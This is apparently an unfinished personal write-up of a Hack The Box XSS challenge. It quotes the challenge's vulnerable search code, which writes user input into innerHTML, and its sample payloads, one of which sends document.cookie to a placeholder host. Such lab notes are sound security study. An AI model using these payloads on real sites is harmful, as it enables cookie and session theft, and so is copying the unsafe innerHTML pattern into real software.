# PhantomsScript

## FLAG: HTB{}

## Status: Incomplete

+ DOCKER: Yes
+ DOWNLOADABLE: No

Description: Note: Wait for the bot to trigger your payload. It might take around ~10 seconds. Every Halloween, an enigmatic blog emerges from the depths of the dark web—Phantom's Script. Its pages are filled with cursed writings and hexed code that ensnare the souls of unwary visitors. The blog's malicious scripts weave dark secrets into the fabric of the internet, spreading corruption with each click. Rumor has it that interacting with the site in unexpected ways can trigger hidden incantations. Will you dare to delve into this haunted scroll, manipulate the scripts, and purge the malevolent code before it claims more victims?

## NOTES

1. Deploy docker instance
   1. DOCKER: 94.237.59.246:32075
2. WEBPAGE
   1. Navigating to the webpage we are met with a site that looks like it is promting for some of XSS
   2. There is a search input form
   3. We also are given two blocks on the side with information
      1. CURSED CODE BLOCK:

            ```js
                searchInput.addEventListener('input', function () {
                    const query = searchInput.value;
                    if (query.trim() !== "") {
                        const filteredArticles = filterArticles(query);
                        searchResultsHeading.innerHTML = `Results for: "${query}"`;
                        searchResultsHeading.style.display = 'block';
                        renderArticles(filteredArticles);
                    } else {
                        searchResultsHeading.style.display = 'none';
                        renderArticles(articles);
                    }
                });
            ```

      2. Spooky Documentation

            ```text
                Challenge Objective
                    Your objective is to identify and the XSS vulnerability lurking in the shadows of the search feature and pop an alert box.

                Application Structure
                    The application consists of the following haunted components:

                    - Search Feature: This is where the cursed XSS vulnerability resides. It accepts user input and displays search results based on the query provided.
                    - Articles Section: This section contains various ghostly articles that the search feature filters through based on the user's input.
                    - Cursed Code Block: This section of the application displays the actual code responsible for rendering search results, allowing you to identify potential security flaws.

                Example Payloads
                    Below are a few spooky payloads to get you started:

                    Basic XSS Payload:
                        <script>alert('Boo!');</script>
                        <script>fetch('[host]')</script>
                
                    More Diabolical Payload:
                        <img src=x onerror="alert('Boo!')">
                        <img src=x onerror="fetch('[HOST]' + document.cookie)" />

                Additional Tips
                    Pay attention to the haunted HTML and JavaScript code. The context in which your payload is executed will determine its effectiveness.
                    Experiment with different sinister payloads to see how the application responds. Some might be blocked by ancient wards, while others may slip through.
                    Use developer tools to test and debug your evil payloads.

                Good luck, and beware the curse of broken code!
            ```

            1. So it looks like this gives us the general instructions for this challenge
3. EXPLOIT
4. 
